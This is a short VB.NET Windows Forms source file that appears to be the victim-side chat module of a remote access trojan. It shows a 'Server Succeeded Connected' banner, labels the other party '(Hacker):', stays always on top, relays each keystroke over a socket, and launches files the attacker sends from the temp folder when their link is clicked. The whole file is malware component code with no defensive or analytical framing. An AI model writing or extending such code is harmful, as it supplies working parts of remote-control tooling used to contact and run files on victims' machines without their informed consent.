Imports System.Text.RegularExpressions

Public Class w

    Private Sub w_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        q.hekoo.Text = ""
    End Sub
    Private Sub Form3_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        Recv.Text = "Server Succeeded Connected..."
        Me.TopMost = True

    End Sub
    Private Sub Sendbox_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles Sendbox.KeyPress
        If e.KeyChar = Chr(Keys.Enter) Then
            If Sendbox.Text = "" Then Exit Sub
            Recv.Text += Environment.NewLine & "(ME):" & Sendbox.Text
            q.Comet.Send("recv" & "|U|" & Sendbox.Text)
            Sendbox.Clear()

        End If

        Dim W$ = q.TextBox4.Text

        If e.KeyChar = Chr(Keys.Back) Then
            q.Comet.Send("dOX" & "|U|" & "019870-*098+21{2}//*+33-9=#oD" & "|U|" & W)
        Else
            If e.KeyChar = Chr(Keys.Enter) Then
            Else
                q.Comet.Send("dOX" & "|U|" & "019870-*098+21{1}\\*+33-9=#oD" & "|U|" & W)
            End If

        End If



    End Sub
    Private Sub Recv_Resize(ByVal sender As Object, ByVal e As System.EventArgs)
        Recv.ScrollToCaret()
    End Sub



    Private Sub Recv_LinkClicked(sender As Object, e As LinkClickedEventArgs) Handles Recv.LinkClicked
        On Error Resume Next
        Process.Start(IO.Path.GetTempPath & e.LinkText)
    End Sub

    Private Sub Recv_TextChanged(sender As Object, e As EventArgs) Handles Recv.TextChanged
        On Error Resume Next
        On Error Resume Next
        Dim era7s As Integer = Recv.Find("(You Have a New File )-> ", 1, RichTextBoxFinds.None)
        Do While era7s > -0
            Recv.Select(era7s, "(You Have a New File )-> ".Length)
            Recv.SelectionColor = Color.DarkSlateGray
            era7s = Recv.Find("(You Have a New File )-> ", era7s + "(You Have a New File )-> ".Length, RichTextBoxFinds.None)
            Application.DoEvents()
            Recv.HideSelection = True
        Loop
        Dim era7 As Integer = Recv.Find("(ME):", 1, RichTextBoxFinds.None)
        Do While era7 > -0
            Recv.Select(era7, "(ME):".Length)
            Recv.SelectionColor = Color.DodgerBlue
            era7 = Recv.Find("(ME):", era7 + "(ME):".Length, RichTextBoxFinds.None)
            Application.DoEvents()
            Recv.HideSelection = True
        Loop
        On Error Resume Next
        Dim era7r As Integer = Recv.Find("(Hacker):", 1, RichTextBoxFinds.None)
        Do While era7r > -0
            Recv.Select(era7r, "(Hacker):".Length)
            Recv.SelectionColor = Color.MediumAquamarine
            era7r = Recv.Find("(Hacker):", era7r + "(Hacker):".Length, RichTextBoxFinds.None)
            Application.DoEvents()
            Recv.HideSelection = True
        Loop
    End Sub


End Class